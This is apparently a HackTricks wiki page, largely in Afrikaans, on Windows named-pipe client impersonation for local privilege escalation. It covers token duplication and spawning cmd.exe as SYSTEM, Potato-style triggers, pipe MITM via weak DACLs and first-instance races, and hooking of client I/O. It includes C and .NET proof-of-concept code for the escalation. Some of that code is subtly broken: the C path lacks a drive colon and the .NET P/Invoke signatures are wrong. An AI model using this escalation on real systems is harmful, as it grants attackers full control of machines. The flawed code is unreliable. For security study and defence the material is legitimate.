# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation is 'n local privilege escalation-primitief waarmee 'n named-pipe-bedienerdraad die security context van 'n kliënt wat daaraan koppel, kan oorneem. In die praktyk kan 'n aanvaller wat kode met SeImpersonatePrivilege kan uitvoer, 'n bevoorregte kliënt (bv. 'n SYSTEM-diens) dwing om aan 'n aanvaller-beheerde pipe te koppel, ImpersonateNamedPipeClient aanroep, die gevolglike token in 'n primary token dupliseer, en 'n proses as die kliënt begin (dikwels NT AUTHORITY\SYSTEM).<sup>[[2]](#references)</sup>

Hierdie bladsy fokus op die kerntegniek. Vir end-to-end exploit chains wat SYSTEM na jou pipe dwing, sien die Potato-familiebladsye waarna hieronder verwys word.

## TL;DR
- Skep 'n named pipe: \\.\pipe\<random> en wag vir 'n verbinding.
- Laat 'n bevoorregte komponent daaraan koppel (spooler/DCOM/EFSRPC/etc.).
- Lees ten minste een boodskap vanaf die pipe, en roep daarna ImpersonateNamedPipeClient aan.
- Open die impersonation token vanaf die huidige draad, DuplicateTokenEx(TokenPrimary), en gebruik CreateProcessWithTokenW/CreateProcessAsUser om 'n SYSTEM-proses te verkry.<sup>[[2]](#references)</sup>

## Vereistes en sleutel-API's
- Voorregte wat tipies deur die aanroepende proses/draad benodig word:
- SeImpersonatePrivilege om 'n verbindende kliënt suksesvol te impersonate en CreateProcessWithTokenW te gebruik.
- Alternatiewelik kan jy, nadat jy SYSTEM ge-impersonate het, CreateProcessAsUser gebruik, wat moontlik SeAssignPrimaryTokenPrivilege en SeIncreaseQuotaPrivilege vereis (dit word bevredig wanneer jy SYSTEM impersonate).
- Kern-API's wat gebruik word:<sup>[[1]](#references)[[4]](#references)</sup>
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (moet ten minste een boodskap lees voordat impersonation plaasvind)
- ImpersonateNamedPipeClient en RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW of CreateProcessAsUser
- Impersonation level: om nuttige aksies plaaslik uit te voer, moet die kliënt SecurityImpersonation toelaat (die verstek vir baie plaaslike RPC/named-pipe-kliënte). Kliënte kan dit verlaag met SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION wanneer hulle die pipe oopmaak.<sup>[[3]](#references)</sup>

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Notas:
- As ImpersonateNamedPipeClient ERROR_CANNOT_IMPERSONATE (1368) terugstuur, maak seker dat jy eers van die pipe lees en dat die client nie impersonation tot Identification level beperk het nie.
- Verkies DuplicateTokenEx met SecurityImpersonation en TokenPrimary om ’n primary token te skep wat geskik is vir process creation.

## .NET vinnige voorbeeld
In .NET kan NamedPipeServerStream via RunAsClient impersonate. Nadat jy impersonating is, duplicate die thread token en skep ’n process.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Algemene triggers/koersings om SYSTEM na jou pipe te kry
Hierdie tegnieke dwing bevoorregte services om aan jou named pipe te koppel sodat jy hulle kan impersonate:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Sien gedetailleerde gebruik en compatibility hier:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

As jy net ’n volledige voorbeeld nodig het van hoe om die pipe te skep en te impersonate om SYSTEM vanaf ’n service trigger te spawn, sien:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC Abuse & MITM (ACLs, First-Instance Races, Client Hooking)

Wanneer ’n bevoorregte service en ’n low-privileged process oor `\\.\pipe\...` kommunikeer, hanteer die pipe soos enige ander untrusted IPC boundary. Benewens klassieke server-side impersonation, kan swak pipe ACLs, onveilige creation flags en client-side trust decisions almal as local privilege escalation primitives gebruik word.<sup>[[7]](#references)</sup>

### Enumerate candidate pipes first
- Lys pipes vinnig vanaf PowerShell: `Get-ChildItem \\.\pipe\`
- Sysinternals `pipelist64.exe` is nuttig om instance counts en single-instance pipes raak te sien.
- Prioritiseer name wat deur services gebruik word wat as `SYSTEM` loop, veral helpers, updaters, launchers en UI brokers.

### MITM via permissive DACLs and extra pipe instances
- Enige process wat met ’n bevoorregte server kan kommunikeer, kan reeds sy protocol fuzz en na privileged verbs soek.<sup>[[7]](#references)</sup>
- Die meer interessante geval is wanneer die DACL `FILE_GENERIC_WRITE`/`GENERIC_WRITE` op die pipe object toestaan. Op named pipes sluit dit implisiet `FILE_CREATE_PIPE_INSTANCE` in (`FILE_APPEND_DATA` deel dieselfde bit), sodat ’n attacker nog ’n server instance met dieselfde naam kan skep.
- Omdat instances in FIFO order gematch word, kan attacker-created en legitimate instances vervleg word: skep ’n rogue instance met `CreateNamedPipe`, open dan dieselfde pipe name met `CreateFile`, en wag vir ’n real client om op die rogue server instance te land.
- Resultaat: observeer, modify, relay of desynchronize privileged IPC sonder dat jy die oorspronklike server process hoef te own.

### First-instance race on pipe security descriptors
- `lpSecurityAttributes` definieer slegs die DACL wanneer die eerste instance van ’n pipe name geskep word.<sup>[[4]](#references)[[7]](#references)</sup>
- As ’n bevoorregte service laat start en nie `FILE_FLAG_FIRST_PIPE_INSTANCE` gebruik nie, kan ’n attacker die pipe name vooraf skep met ’n permissive DACL, en dan die service later verdere instances onder die attacker-chosen security context laat skep.
- Dit verander service startup in ’n race condition: wen die first instance, en connect of MITM dan later clients met die weakened ACL.
- Mitigation vir defenders, en ’n belangrike review point vir attackers: check of `CreateNamedPipe(..., dwOpenMode, ...)` `FILE_FLAG_FIRST_PIPE_INSTANCE` insluit. Indien nie, toets pre-creation voordat die service start.

### PID/signature checks are hardening, not a boundary
- Sommige products probeer access beperk deur `GetNamedPipeClientProcessId`, process image path of die Authenticode signer van die connecting client te check.<sup>[[7]](#references)</sup>
- Dit help slegs totdat jy in die legitimate client inject: sodra jy binne die trusted process is, erf jy presies die PID/image/signature context wat die server verwag.
- Vir split desktop apps is dit dikwels makliker om die low-privileged UI/helper process te instrument as om die `SYSTEM` service direk aan te val.

### Hook the client according to its I/O model
- Synchronous I/O: intercept `NtWriteFile` voordat die syscall die buffer consume, en inspect/patch `NtReadFile` nadat dit terugkeer.<sup>[[7]](#references)</sup>
- Overlapped I/O: stoor die `OVERLAPPED`/`IoStatusBlock` wat in `NtReadFile` gesien word, en inspect dan die buffer nadat `GetOverlappedResult` of die relevante wait voltooi is.
- Completion ports: `GetQueuedCompletionStatus` bereik `NtRemoveIoCompletion`; die returned `ApcContext` link terug na die `OVERLAPPED` wat deur die oorspronklike read gebruik is, wat die regte pivot is om die nou-gepopulate buffer te vind.
- Completion routines (`ReadFileEx`): die completion callback word as ’n APC afgelewer. As jy returned data wil tamper of synthetic replies wil inject, hook die real completion routine en gebruik, vir custom injection, ’n one-argument `QueueUserAPC` dispatcher wat die routine se 3 verwagte arguments rekonstrueer.<sup>[[5]](#references)[[7]](#references)</sup>

### Tooling notes
- [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) proxy named-pipe traffic deur ’n injected helper DLL en bied ’n Burp-like workflow vir editing/replay.<sup>[[6]](#references)</sup>
- [thats_no_pipe](https://github.com/synacktiv/thats_no_pipe) gebruik ’n Frida-based approach en fokus op hooking van `NtReadFile`/`NtWriteFile` plus die async/completion pivots hier bo, en stuur dan traffic aan na ’n WebSocket-backed editing workflow.<sup>[[7]](#references)[[8]](#references)</sup>
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
### Operasionele oorwegings
- Named pipes het lae latency; lang pouses tydens die redigering van buffers kan brose services deadlock.<sup>[[7]](#references)</sup>
- Overlapped/completion-port/APC-driven clients benodig ander hooks as eenvoudige `ReadFile`/`WriteFile` detours.
- Injection in die trusted client is raserig en word oor die algemeen die beste beperk tot exploit development, protocol reversing of plaaslike lab fuzzing.

## Probleemoplossing en slaggate
- Jy moet ten minste een boodskap vanaf die pipe lees voordat jy ImpersonateNamedPipeClient aanroep; anders kry jy ERROR_CANNOT_IMPERSONATE (1368).<sup>[[1]](#references)</sup>
- As die client met SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION koppel, kan die server nie volledig impersonate nie; kontroleer die token se impersonation level via GetTokenInformation(TokenImpersonationLevel).<sup>[[3]](#references)</sup>
- CreateProcessWithTokenW vereis SeImpersonatePrivilege op die caller. As dit misluk met ERROR_PRIVILEGE_NOT_HELD (1314), gebruik CreateProcessAsUser nadat jy reeds SYSTEM geïmpersonate het.
- Maak seker dat jou pipe se security descriptor die target service toelaat om te koppel as jy dit harden; by verstek is pipes onder \\.\pipe toeganklik volgens die server se DACL.<sup>[[3]](#references)</sup>

## References

- [1] [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [2] [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [3] [Microsoft: Named Pipe Security and Access Rights](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-security-and-access-rights)
- [4] [Microsoft: CreateNamedPipe function](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea)
- [5] [Microsoft: Named Pipe Server Using Completion Routines](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-server-using-completion-routines)
- [6] [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)
- [7] [Synacktiv: Hooking Windows Named Pipes](https://www.synacktiv.com/en/publications/hooking-windows-named-pipes.html)
- [8] [Synacktiv: thats_no_pipe](https://github.com/synacktiv/thats_no_pipe)

{{#include ../../banners/hacktricks-training.md}}
